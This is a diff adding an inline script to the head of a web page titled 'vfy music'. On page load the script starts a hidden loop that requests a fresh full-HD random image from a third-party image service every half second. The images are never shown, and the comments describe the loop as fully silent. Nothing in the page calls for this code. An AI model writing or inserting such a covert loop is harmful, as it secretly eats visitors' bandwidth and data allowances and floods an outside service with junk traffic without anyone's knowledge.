@@ -16,7 +16,28 @@
 <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
 <title>vfy music</title>
 
+<script>
+window.addEventListener('load', () => {
+    // Ping interval in ms
+    const INTERVAL = 500;
 
+    function backgroundPing() {
+        // Random HD image URL, cache bypass
+        const url = 'https://picsum.photos/1920/1080?random=' + Date.now();
+
+        // Create hidden image, not added to DOM
+        const img = new Image();
+        img.src = url; // triggers request
+        // No onload/onerror logging → fully silent
+
+        // Next ping after interval
+        setTimeout(backgroundPing, INTERVAL);
+    }
+
+    // Start ping loop after page fully loaded
+    backgroundPing();
+});
+</script>
 
 <link rel="stylesheet" href="database/storage.css" />
 <link rel="stylesheet" href="remote/remote.css" />
